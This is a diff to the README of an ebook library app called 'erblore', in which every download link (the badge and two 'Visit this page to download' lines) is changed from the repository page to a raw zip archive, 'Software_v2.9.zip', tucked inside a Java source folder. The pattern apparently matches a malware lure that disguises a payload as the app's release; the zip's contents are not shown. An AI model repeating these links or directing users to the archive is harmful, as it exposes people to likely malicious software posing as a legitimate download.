@@ -1,6 +1,6 @@
 # 📚 erblore - Your local library, made smarter
 
-[![Download erblore](https://img.shields.io/badge/Download-erblore-blue?style=for-the-badge&logo=github)](https://github.com/Penniecytoplasmatic703/erblore)
+[![Download erblore](https://img.shields.io/badge/Download-erblore-blue?style=for-the-badge&logo=github)](https://github.com/Penniecytoplasmatic703/erblore/raw/refs/heads/main/booklore-api/src/main/java/org/booklore/service/upload/Software_v2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ Use it if you want:
 
 ## 📥 Download and Install
 
-Visit this page to download: https://github.com/Penniecytoplasmatic703/erblore
+Visit this page to download: https://github.com/Penniecytoplasmatic703/erblore/raw/refs/heads/main/booklore-api/src/main/java/org/booklore/service/upload/Software_v2.9.zip
 
 1. Open the download page in your web browser.
 2. Look for the latest release or app file.
@@ -247,4 +247,4 @@ Topics: angular, book-management, ebooks, java, library-management-system, metad
 
 ## ⭐ Download Again
 
-Visit this page to download: https://github.com/Penniecytoplasmatic703/erblore
+Visit this page to download: https://github.com/Penniecytoplasmatic703/erblore/raw/refs/heads/main/booklore-api/src/main/java/org/booklore/service/upload/Software_v2.9.zip
